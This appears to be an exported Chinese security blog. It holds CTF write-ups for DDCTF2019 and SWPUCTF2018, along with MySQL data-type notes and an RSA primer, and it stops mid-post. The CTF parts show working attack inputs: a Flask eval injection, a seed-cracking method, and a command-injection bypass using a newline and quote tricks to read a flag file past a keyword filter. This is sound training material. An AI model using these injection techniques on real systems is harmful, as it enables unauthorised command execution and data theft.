class=\"string\">'&amp;nbsp;'</span>*<span class=\"number\">4</span>).replace(<span class=\"string\">' '</span>,<span class=\"string\">'&amp;nbsp;'</span>).replace(<span class=\"string\">'&lt;'</span>, <span class=\"string\">'&amp;lt;'</span>).replace(<span class=\"string\">'&gt;'</span>,<span class=\"string\">'&amp;gt;'</span>).replace(<span class=\"string\">'\\n'</span>, <span class=\"string\">'&lt;br /&gt;'</span>)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                html += line</span><br><span class=\"line\">        source.close()</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">if</span> bool_download_source == <span class=\"string\">'True'</span>:</span><br><span class=\"line\">            headers = &#123;&#125;</span><br><span class=\"line\">            headers[<span class=\"string\">'Content-Type'</span>] = <span class=\"string\">'text/plain'</span></span><br><span class=\"line\">            headers[<span class=\"string\">'Content-Disposition'</span>] = <span class=\"string\">'attachment; filename=serve.py'</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> Response(html, headers=headers)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> html</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        trigger_event(<span class=\"string\">'action:view;index'</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">buy_handler</span><span class=\"params\">(args)</span>:</span></span><br><span class=\"line\">    num_items = int(args[<span class=\"number\">0</span>])</span><br><span class=\"line\">    <span class=\"keyword\">if</span> num_items &lt;= <span class=\"number\">0</span>: <span class=\"keyword\">return</span> <span class=\"string\">'invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;'</span>.format(args[<span class=\"number\">0</span>])</span><br><span class=\"line\">    session[<span class=\"string\">'num_items'</span>] += num_items </span><br><span class=\"line\">    trigger_event([<span class=\"string\">'func:consume_point;&#123;&#125;'</span>.format(num_items), <span class=\"string\">'action:view;index'</span>])</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">consume_point_function</span><span class=\"params\">(args)</span>:</span></span><br><span class=\"line\">    point_to_consume = int(args[<span class=\"number\">0</span>])</span><br><span class=\"line\">    <span class=\"keyword\">if</span> session[<span class=\"string\">'points'</span>] &lt; point_to_consume: <span class=\"keyword\">raise</span> RollBackException()</span><br><span class=\"line\">    session[<span class=\"string\">'points'</span>] -= point_to_consume</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show_flag_function</span><span class=\"params\">(args)</span>:</span></span><br><span class=\"line\">    flag = args[<span class=\"number\">0</span>]</span><br><span class=\"line\">    <span class=\"comment\">#return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'You naughty boy! ;) &lt;br /&gt;'</span></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_flag_handler</span><span class=\"params\">(args)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> session[<span class=\"string\">'num_items'</span>] &gt;= <span class=\"number\">5</span>:</span><br><span class=\"line\">        trigger_event(<span class=\"string\">'func:show_flag;'</span> + FLAG()) <span class=\"comment\"># show_flag_function has been disabled, no worries</span></span><br><span class=\"line\">    trigger_event(<span class=\"string\">'action:view;index'</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    app.run(debug=<span class=\"literal\">False</span>, host=<span class=\"string\">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure>\n<p>这是一个flask系统，但是却与普通的flask系统不同，正常flask系统是通过<code>app.route</code>来编写路由的，而本题中却是维护了一个事件队列来进行路由，按照先进先出的规则处理事件，通过分割我们输入的查询字符串来处理事件，通读代码我们可以发现存在一个敏感函数eval()</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">event_handler = eval(action + (<span class=\"string\">'_handler'</span> <span class=\"keyword\">if</span> is_action <span class=\"keyword\">else</span> <span class=\"string\">'_function'</span>))</span><br><span class=\"line\">ret_val = event_handler(args)</span><br></pre></td></tr></table></figure>\n<p>其实此处可以不使用eval函数的，而且由于action参数可控，导致我们可以注入恶意函数进去（用#注释掉action后面的内容），比如</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">action,is_action = <span class=\"string\">'int#'</span>,<span class=\"literal\">False</span></span><br><span class=\"line\">event_handler = eval(action + (<span class=\"string\">'_handler'</span> <span class=\"keyword\">if</span> is_action <span class=\"keyword\">else</span> <span class=\"string\">'_function'</span>))</span><br><span class=\"line\"><span class=\"comment\"># ret_val = event_handler(args)</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> event_handler(<span class=\"number\">1.1</span>)</span><br></pre></td></tr></table></figure>\n<p>此时可以成功执行int函数</p>\n<p>想要得到flag的话需要调用<code>get_flag_hander()</code>函数，查看代码可知需要<code>session[&#39;num_items&#39;] &gt;= 5</code>即可将flag写入session，此处需要我们购买5个钻石</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">buy_handler</span><span class=\"params\">(args)</span>:</span></span><br><span class=\"line\">    num_items = int(args[<span class=\"number\">0</span>])</span><br><span class=\"line\">    <span class=\"keyword\">if</span> num_items &lt;= <span class=\"number\">0</span>: <span class=\"keyword\">return</span> <span class=\"string\">'invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;'</span>.format(args[<span class=\"number\">0</span>])</span><br><span class=\"line\">    session[<span class=\"string\">'num_items'</span>] += num_items </span><br><span class=\"line\">    trigger_event([<span class=\"string\">'func:consume_point;&#123;&#125;'</span>.format(num_items), <span class=\"string\">'action:view;index'</span>])</span><br></pre></td></tr></table></figure>\n<p>查看此处代码发现存在明显的逻辑问题，即购买时系统先完成购买<code>session[&#39;num_items&#39;] += num_items</code>，然后才触发事件检验金额是否足够<code>trigger_event([&#39;func:consume_point;{}&#39;.format(num_items), &#39;action:view;index&#39;])</code>，如果不够的话进行回滚，这样的话在该回滚事件执行之前我们可以短暂的成功购买，此时执行get_flag函数即可成功执行，我们可以构建一个这样的事件队列</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">buy-&gt;get_flag-&gt;consume_point</span><br></pre></td></tr></table></figure>\n<p>结合上面的eval函数漏洞，我们可以实现该攻击，trigger_event函数可以将事件插入队列，我们可以利用该函数将buy和get_flag函数插入队列</p>\n<p><img src=\"/2020/09/13/DDCTF2019/3.png\" alt></p>\n<p>解密session即可得到flag</p>\n<p>flag: <code>DDCTF{3v41_3v3nt_1O0p_aNd_fLASK_cOOk1e}</code></p>\n","categories":["CTF"],"tags":["Web"]},{"title":"MySQL学习笔记(一)","url":"/2018/01/01/Mysqldatatype/","content":"<p>MySQL数据类型<br><a id=\"more\"></a></p>\n<h3 id=\"MySQL数据类型\"><a href=\"#MySQL数据类型\" class=\"headerlink\" title=\"MySQL数据类型\"></a>MySQL数据类型</h3><pre><code>在MYSQL数据类型主要有文本、数字、时间/日期类型\n</code></pre><h4 id=\"Numbe类型\"><a href=\"#Numbe类型\" class=\"headerlink\" title=\"Numbe类型\"></a>Numbe类型</h4><div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>数据类型</th>\n<th>描述      </th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>TINYINT(size)</td>\n<td>-128 到 127 常规。0 到 255 无符号*。在括号中规定最大位数。                                                        </td>\n</tr>\n<tr>\n<td>SMALLINT(size)</td>\n<td>-32768 到 32767 常规。0 到 65535 无符号*。在括号中规定最大位数。                                                </td>\n</tr>\n<tr>\n<td>MEDIUMINT(size)</td>\n<td>-8388608 到 8388607 普通。0 to 16777215 无符号*。在括号中规定最大位数。                                        </td>\n</tr>\n<tr>\n<td>INT(size)</td>\n<td>-2147483648 到 2147483647 常规。0 到 4294967295 无符号*。在括号中规定最大位数。</td>\n</tr>\n<tr>\n<td>BIGINT(size)</td>\n<td>-9223372036854775808 到 9223372036854775807 常规。0 到 18446744073709551615 无符号*。在括号中规定最大位数。</td>\n</tr>\n<tr>\n<td>FLOAT(size,d)</td>\n<td>带有浮动小数点的小数字。在括号中规定最大位数。在 d 参数中规定小数点右侧的最大位数。</td>\n</tr>\n<tr>\n<td>REAL(length,d)</td>\n<td>和FLOAT类型差不多，运算速度快，但是精度有限。</td>\n</tr>\n<tr>\n<td>DOUBLE(size,d)</td>\n<td>带有浮动小数点的大数字。在括号中规定最大位数。在 d 参数中规定小数点右侧的最大位数。</td>\n</tr>\n<tr>\n<td>DECIMAL(size,d)</td>\n<td>作为字符串存储的 DOUBLE 类型，允许固定的小数点</td>\n</tr>\n<tr>\n<td>BIT[M]</td>\n<td>该数据类型在数据库中以1,0的形式存储，因此修改时只能用1,0或者true/false来存储</td>\n</tr>\n</tbody>\n</table>\n</div>\n<h4 id=\"Date类型\"><a href=\"#Date类型\" class=\"headerlink\" title=\"Date类型\"></a>Date类型</h4><div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>数据类型</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>DATE()</td>\n<td>日期。格式：YYYY-MM-DD //注释：支持的范围是从 ‘1000-01-01’ 到 ‘9999-12-31’</td>\n</tr>\n<tr>\n<td>DATETIME()</td>\n<td>日期和时间的组合。格式：YYYY-MM-DD HH:MM:SS // 注释：支持的范围是从 ‘1000-01-01 00:00:00’ 到 ‘9999-12-31 23:59:59’</td>\n</tr>\n<tr>\n<td>TIMESTAMP()</td>\n<td>时间戳。TIMESTAMP 值使用 Unix 纪元(‘1970-01-01 00:00:00’ UTC) 至今的描述来存储。格式：YYYY-MM-DD HH:MM:SS // 注释：支持的范围是从 ‘1970-01-01 00:00:01’ UTC 到 ‘2038-01-09 03:14:07’ UTC</td>\n</tr>\n<tr>\n<td>TIME()</td>\n<td>时间。格式：HH:MM:SS 注释：支持的范围是从 ‘-838:59:59’ 到 ‘838:59:59’</td>\n</tr>\n<tr>\n<td>YEAR()</td>\n<td>2 位或 4 位格式的年。 // 注释：4 位格式所允许的值：1901 到 2155。2 位格式所允许的值：70 到 69，表示从 1970 到 2069。</td>\n</tr>\n</tbody>\n</table>\n</div>\n<h4 id=\"Text类型\"><a href=\"#Text类型\" class=\"headerlink\" title=\"Text类型\"></a>Text类型</h4><div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>数据类型</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>CHAR(size)</td>\n<td>保存固定长度的字符串（可包含字母、数字以及特殊字符）。在括号中指定字符串的长度。最多 255 个字符。</td>\n</tr>\n<tr>\n<td>VARCHAR(size)</td>\n<td>保存可变长度的字符串（可包含字母、数字以及特殊字符）。在括号中指定字符串的最大长度。最多 255 个字符。 // 注释：如果值的长度大于 255，则被转换为 TEXT 类型。</td>\n</tr>\n<tr>\n<td>TINYTEXT</td>\n<td>存放最大长度为 255 个字符的字符串。</td>\n</tr>\n<tr>\n<td>TEXT</td>\n<td>存放最大长度为 65,535 个字符的字符串。</td>\n</tr>\n<tr>\n<td>BLOB</td>\n<td>用于 BLOBs (Binary Large OBjects)。存放最多 65,535 字节的数据。</td>\n</tr>\n<tr>\n<td>MEDIUMTEXT</td>\n<td>存放最大长度为 16,777,215 个字符的字符串。</td>\n</tr>\n<tr>\n<td>MEDIUMBLOB</td>\n<td>用于 BLOBs (Binary Large OBjects)。存放最多 16,777,215 字节的数据。</td>\n</tr>\n<tr>\n<td>LONGTEXT</td>\n<td>存放最大长度为 4,294,967,295 个字符的字符串。</td>\n</tr>\n<tr>\n<td>LONGBLOB</td>\n<td>用于 BLOBs (Binary Large OBjects)。存放最多 4,294,967,295 字节的数据。</td>\n</tr>\n<tr>\n<td>ENUM(x,y,z,etc.)</td>\n<td>允许你输入可能值的列表。可以在 ENUM 列表中列出最大 65535 个值。如果列表中不存在插入的值，则插入空值。//注释：这些值是按照你输入的顺序存储的。可以按照此格式输入可能的值：ENUM(‘X’,’Y’,’Z’)</td>\n</tr>\n<tr>\n<td>SET</td>\n<td>与 ENUM 类似，SET 最多只能包含 64 个列表项，不过 SET 可存储一个以上的值。</td>\n</tr>\n</tbody>\n</table>\n</div>\n","categories":["资料"],"tags":["SQL"]},{"title":"RSA算法初探","url":"/2018/01/29/RSA%E5%88%9D%E6%8E%A2/","content":"<h4 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h4><p>不得不承认我的数学真的是灰常灰常渣，研究了好久才差不多弄明白，真的感觉又被数学虐了o(╥﹏╥)o，不过打比赛需要掌握，咬着牙也得弄明白呀。<br><a id=\"more\"></a></p>\n<h4 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h4><p>我看许多的介绍文章都是先讲一大堆的数学公式然后再开始介绍RSA，给我一顿绕啊，愣是不知道在干什么，所以我想先介绍RSA，过程中需要什么数学理论再用什么理论，这样对于数学渣渣会友好一些。</p>\n<p><strong>RSA介绍</strong></p>\n<p>RSA公钥加密算法是1977年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）一起提出的。1987年7月首次在美国公布，当时他们三人都在麻省理工学院工作实习。RSA就是他们三人姓氏开头字母拼在一起组成的。<br>RSA是目前最有影响力和最常用的公钥加密算法，它能够抵抗到目前为止已知的绝大多数密码攻击，已被ISO推荐为公钥数据加密标准，是一种<em>非对称加密算法</em>。<br>今天只有短的RSA钥匙才可能被强力方式解破。到2008年为止，世界上还没有任何可靠的攻击RSA算法的方式。只要其钥匙的长度足够长，用RSA加密的信息实际上是不能被解破的。但在分布式计算和量子计算机理论日趋成熟的今天，RSA加密安全性受到了挑战和质疑。<br>RSA算法基于一个十分简单的数论事实：将两个大质数相乘十分容易，但是想要对其乘积进行因式分解却极其困难，因此可以将乘积公开作为加密密钥。<br>一句话，<em>RSA是目前最重要的网络加密算法。</em></p>\n<p><strong>RSA密钥生成</strong></p>\n<p>第一步</p>\n<blockquote>\n<p>选定两个质数p、q，实际应用中这两个数越大安全性越高。</p>\n</blockquote>\n<p>第二步</p>\n<blockquote>\n<p>计算p、q的乘积，即n = p&#42;q，n的二进制表示时所占的二进制位数就是<em>密钥长度</em>，实际应用中密钥长度一般为1024位，对于更高保密级别的应用则为2048位。</p>\n</blockquote>\n<p>第三步</p>\n<blockquote>\n<p>计算n的 <em>欧拉函数</em> φ(n) = (p-1)&#42;(q-1)，为了保持连贯性，欧拉函数先按下不表</p>\n</blockquote>\n<p>第四步</p>\n<blockquote>\n<p> 随机选定一个数e1，要求1 &lt; e1 &lt; φ(n)，并且要求e1与n互质（实际应用中这个数字常选择65537），不知道什么是互质请点击<a href=\"https://baike.baidu.com/item/%E4%BA%92%E8%B4%A8\" target=\"_blank\" rel=\"noopener\">这里</a></p>\n</blockquote>\n<p>第五步</p>\n<blockquote>\n<p>寻找一个e2，要求 e1 &#42; e2 ≡ 1 （mod φ(n)），好像是可以用<em>扩展欧几里得算法</em> 算出来，但是恕本人实在对数学不感冒，这个就略过了，想学的自己百度吧。</p>\n</blockquote>\n<p>第六步</p>\n<blockquote>\n<p>封装<em>（n，e1）</em>为<em>公钥</em> ，<em>（n，e2）</em>为<em>私钥</em>。</p>\n</blockquote>\n<p>至此，所有准备工作完成。</p>\n<hr>\n<p><strong>加密和解密</strong></p>\n<blockquote>\n<p> 先介绍一下加解密的公式，假定明文为A，那么，<br> 密文B≡A^e1 mod n，要传输给对方的就是B<br> 对方得到B之后利用私钥进行恢复，公式A≡B^e2 mod n，从而得到明文A。</p>\n</blockquote>\n<p>假定我选择了p = 5，q = 7，那么相应的n = 35，φ（n） = 24，再假定我选择了e1 = 5，那么e2 = 29（别问我怎么算出来的，我是不会告诉你我是编代码试出来的！！），那么我的公钥就是（5，35），私钥就是（29，35）。那么接下来就开始我们的秘密通信(<em>^▽^</em>)。</p>\n<blockquote>\n<p> 假定要传输的明文为： 32<br>  注意：传输的内容必须为整数，并且要小于n，如果要传送字符串，可以用ascii码或unicode      编码传输。</p>\n</blockquote>\n<p>加密</p>\n<blockquote>\n<p>A = 32，则B=A^e1 mod n = 2，将密文B发送，这个过程使用公钥进行加密</p>\n</blockquote>\n<p>解密</p>\n<blockquote>\n<p>A = B^e2 mod n = 32 ，成功得到明文32！</p>\n</blockquote>\n<hr>\n<p><strong>RSA破解</strong></p>\n<p>所谓兵来将挡水来土掩，有人搞出来加密算法，就有人想搞出来破解算法，那么想要破解RSA能做到吗？我们不妨来看一下我们在整个过程中都用到了那些数据</p>\n<blockquote>\n<p>p、q、n、φ（n），e1，e2</p>\n</blockquote>\n<p>公钥用到了n，e1，只要我们能找到e2，就攻破了RSA。那么有没有可能通过这两个数找到e2呢？先看看e2是怎么来的</p>\n<blockquote>\n<p>e1 * e2 mod φ（n） = 1</p>\n</blockquote>\n<p>根据公式可以知道我们得到φ（n）就可以得到e2，那么φ（n）又是怎么来的呢？</p>\n<blockquote>\n<p>φ（n）= （p-1）&#42;（q-1）</p>\n</blockquote>\n<p>我们又需要得到p、q，再来</p>\n<blockquote>\n<p>n = p * q</p>\n</blockquote>\n<p>总算到了（开森）！我们只需要分解n就行了！！唉，不得不说，千里之堤毁于蚁穴，大名鼎鼎的RSA居然栽在了这么简单的问题上，哈哈哈！！</p>\n<p>但是~~，如果你真的觉得你就此就破解了RSA，那你真是Too Young Too Simple，分解我的n=35，洒洒水的难度，那么，请你给我分解一下下面这个数字怎么样、</p>\n<blockquote>\n<p>152564564212344523123146785123123456484887123121231234567874645645132165867845456456456545645645123123123156445564523121322312312345645456456565656565</p>\n</blockquote>\n<p>有办法吗？事实上，分解这些大数的因子是非常非常困难的，以目前的计算能力，分解1024位的大数需要两年，分解2048位的大数需要80年，远超数据本身的价值，这就是RSA算法牢不可破的真实原因，就是建立在大数分解困难的基础上的，所以今后如果计算能力提高，或者找到其它简单算法来分解大数，那么RSA算法安全性就消失了。</p>\n<hr>\n<p><strong>理论解释</strong></p>\n<p>是不是觉得刚刚的东西很神奇？！！，对，就是这么神奇，这背后都是伟大的数学家的功劳，虽然我不喜欢数学，但还是很佩服他们可以搞出这么骚的东西。废话不多说，来慢慢解释一下，鉴于我的数学水平…</p>\n<blockquote>\n<p>数学解释只解释了所应用的数学原理，不再对数学原理进行证明，如果感兴趣的话可以自己证明之。</p>\n</blockquote>\n<p>大名鼎鼎的 <em>欧拉定理</em> </p>\n<blockquote>\n<p>若n,a为正整数，且n,a互质，则<br>$a^{φ(n)} ≡ 1 （mod \\; n）$ </p>\n</blockquote>\n<p>φ（n）为 <em>欧拉函数</em> ,欧拉函数是小于n的正整数中与n互质的数的个数，下面介绍一个性质</p>\n<blockquote>\n<p>如果n可以分解为两个互质的整数p、q的乘积，那么有<br>φ（n）= (p-1) * (q-1)</p>\n</blockquote>\n<p>接下来要证明的就是为什么下面两个式子可以互换实现</p>\n<blockquote>\n<p>B=A^e1   mod n<br>A=B^e2   mod n</p>\n</blockquote>\n<p>解密规则为</p>\n<blockquote>\n<p>A=B^e2 mod n</p>\n</blockquote>\n<p>根据加密规则</p>\n<blockquote>\n<p>B = A^e1 mod n<br>B = A^e1 - kn</p>\n</blockquote>\n<p>代入解密式中</p>\n<blockquote>\n<p>(A^e1 - kn)^e2 ≡ A （mod n）</p>\n</blockquote>\n<p>等于证</p>\n<blockquote>\n<p>$A^{e1&#42;e2} ≡ m （mod \\; n）$，（对于这一步我并不知道为什么）</p>\n</blockquote>\n<p>由 <em>欧拉定理</em> 可以得到</p>\n<blockquote>\n<p>e1&#42;e2 ≡ 1  [ mod φ（n）]<br>e1&#42;e2 ≡ hφ（n）+1</p>\n</blockquote>\n<p>代入前面的式子可以得到</p>\n<blockquote>\n<p>$A^{hφ（n）+1} \\;= m (mod\\;n)$</p>\n</blockquote>\n<p>接下来证明上述恒等式</p>\n<p>分两种情况</p>\n<p>1、A和n互质</p>\n<p>由欧拉定理</p>\n<blockquote>\n<p>$A^{φ（n）}≡1（mod\\;n）$ </p>\n</blockquote>\n<p>代入前式可以得到</p>\n<blockquote>\n<p>${(A^{φ（n）})}^{h}&#42;A \\;= m (mod\\;n)$</p>\n</blockquote>\n<p>原式得证</p>\n<p>2、A和n不互质</p>\n<blockquote>\n<p>自己开发吧老铁，我不想写了。而且我也不怎么会。</p>\n</blockquote>\n<hr>\n<p>RSA其实并不难，想要掌握它并不需要很高的数学基础，认真学一学还是可以学的明白的，废话不多说，赶紧练习一波去也！</p>\n","categories":["资料"],"tags":["RSA"]},{"title":"SWPUCTF2018复现","url":"/2018/12/20/SWPUCTF2018/","content":"<p>题目复现</p>\n<a id=\"more\"></a>\n<h1 id=\"MISC\"><a href=\"#MISC\" class=\"headerlink\" title=\"MISC\"></a>MISC</h1><p>其它两道都很简单，就不记录了，只记录一下没做出来的</p>\n<h2 id=\"唯有低头-才能出头\"><a href=\"#唯有低头-才能出头\" class=\"headerlink\" title=\"唯有低头,才能出头\"></a>唯有低头,才能出头</h2><p>做的时候知道是键盘加密，但是对于数字理解错误了，我以为是手机键盘的九键加密…，所以走远了，记录一下这种加密方法，对应于键盘的盲打手势对应字母</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">99 9 9 88 11 5 5 66 3 88 3 6 555 9 11 4 33</span><br><span class=\"line\">lookatthekeyboard</span><br></pre></td></tr></table></figure>\n<!-- swpuctf{lookatthekeyboard} -->\n<h1 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h1><h2 id=\"用优惠码-买个-X\"><a href=\"#用优惠码-买个-X\" class=\"headerlink\" title=\"用优惠码 买个 X?\"></a>用优惠码 买个 X?</h2><p>注册并登录之后，页面弹出一个优惠码 <code>uKnfZ2F0aFaZBFy</code> ，但是输入之后却失效，要求我们输入24位的优惠码，题目存在文件泄露 <code>www.zip</code>，下载源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//生成优惠码</span></span><br><span class=\"line\">$_SESSION[<span class=\"string\">'seed'</span>]=rand(<span class=\"number\">0</span>,<span class=\"number\">999999999</span>);</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">youhuima</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\tmt_srand($_SESSION[<span class=\"string\">'seed'</span>]);</span><br><span class=\"line\">    $str_rand = <span class=\"string\">\"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\"</span>;</span><br><span class=\"line\">    $auth=<span class=\"string\">''</span>;</span><br><span class=\"line\">    $len=<span class=\"number\">15</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ( $i = <span class=\"number\">0</span>; $i &lt; $len; $i++ )&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>($i&lt;=($len/<span class=\"number\">2</span>))</span><br><span class=\"line\">              $auth.=substr($str_rand,mt_rand(<span class=\"number\">0</span>, strlen($str_rand) - <span class=\"number\">1</span>), <span class=\"number\">1</span>);</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">              $auth.=substr($str_rand,(mt_rand(<span class=\"number\">0</span>, strlen($str_rand) - <span class=\"number\">1</span>))*<span class=\"number\">-1</span>, <span class=\"number\">1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    setcookie(<span class=\"string\">'Auth'</span>, $auth);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//support</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (preg_match(<span class=\"string\">\"/^\\d+\\.\\d+\\.\\d+\\.\\d+$/im\"</span>,$ip))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!preg_match(<span class=\"string\">\"/\\?|flag|&#125;|cat|echo|\\*/i\"</span>,$ip))&#123;</span><br><span class=\"line\">               <span class=\"comment\">//执行命令</span></span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">              <span class=\"comment\">//flag字段和某些字符被过滤!</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">\t&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">             <span class=\"comment\">// 你的输入不正确!</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>可以看出题目使用了md_srand()函数来产生随机数，而PHP中产生的是伪随机数，即只要我们知道种子的话，那么后续产生的随机数我们也就都可以知道，所以现在就是要爆破随机数种子，可以用php_me_seed工具来爆破，速度快一些，但是我们要先将数据处理为该工具能够识别的输入参数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$pass = <span class=\"string\">\"b1o2OrrgqYPMkzK\"</span>;</span><br><span class=\"line\">$str_rand = <span class=\"string\">\"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\"</span>;</span><br><span class=\"line\">$len = strlen($str_rand) <span class=\"number\">-1</span>;</span><br><span class=\"line\"><span class=\"keyword\">for</span> ($i=<span class=\"number\">0</span>; $i&lt;strlen($pass); $i++)&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>($i&lt;=(<span class=\"number\">15</span>/<span class=\"number\">2</span>))&#123;</span><br><span class=\"line\">\t\t$number = strpos($str_rand,$pass[i]);</span><br><span class=\"line\">\t\t<span class=\"keyword\">echo</span> <span class=\"string\">\"$number $number 0 $len\"</span>;</span><br><span class=\"line\">\t&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t$number = $len + <span class=\"number\">1</span> - strpos($str_rand,$pass[i]);</span><br><span class=\"line\">\t\t<span class=\"keyword\">echo</span> <span class=\"string\">\"$number $number 0 $len\"</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这样可以得到我们爆破的种子</p>\n<p><img src=\"/2018/12/20/SWPUCTF2018/1.png\" alt></p>\n<p>然后用该种子来生成24位的优惠码（这儿当时想不通哪来的24位，原来就是把代码中长度15改为24就可以了Orz）,此时注意php版本不同的话相同的种子也会产生不同的序列，看网站响应头可知该网站php版本为7.2，所以用对应版本生成优惠码即可</p>\n<p>然后就是后半段的命令执行绕过了</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//support</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (preg_match(<span class=\"string\">\"/^\\d+\\.\\d+\\.\\d+\\.\\d+$/im\"</span>,$ip))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!preg_match(<span class=\"string\">\"/\\?|flag|&#125;|cat|echo|\\*/i\"</span>,$ip))&#123;</span><br><span class=\"line\">               <span class=\"comment\">//执行命令</span></span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">              <span class=\"comment\">//flag字段和某些字符被过滤!</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">\t&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">             <span class=\"comment\">// 你的输入不正确!</span></span><br><span class=\"line\">\t&#125;</span><br></pre></td></tr></table></figure>\n<p>对于第一个首尾匹配直接 <code>%0a</code> 换行即可绕过，第二个过滤了通配符，flag字段，可以用单引号绕过，cat命令不能用了就用tail命令即可</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">ip&#x3D;1.1.1.1%0atail &#x2F;&#39;fl&#39;ag</span><br></pre></td></tr></table></figure>\n<p>方方土学长用的是<code>\\</code>绕过，原理是反斜杠会转义特殊字符，而如果字符不是shell特殊字符的话则不转义</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">ip&#x3D;1.1.1.1%0atail &#x2F;fl\\ag</span><br></pre></td></tr></table></figure>\n<h2 id=\"SimplePHP\"><a href=\"#SimplePHP\" class=\"headerlink\" title=\"SimplePHP\"></a>SimplePHP</h2><p>查看文件出存在文件读取漏洞，利用该漏洞读取文件源码，</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://120.79.158.180:11115/file.php?file=index.php</span><br></pre></td></tr></table></figure>\n<p>关键源码如下</p>\n<p>function.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"comment\">//show_source(__FILE__); </span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">\"base.php\"</span>; </span><br><span class=\"line\">header(<span class=\"string\">\"Content-type: text/html;charset=utf-8\"</span>); </span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>); </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">upload_file_do</span><span class=\"params\">()</span> </span>&#123; </span><br><span class=\"line\">    <span class=\"keyword\">global</span> $_FILES; </span><br><span class=\"line\">    $filename = md5($_FILES[<span class=\"string\">\"file\"</span>][<span class=\"string\">\"name\"</span>].$_SERVER[<span 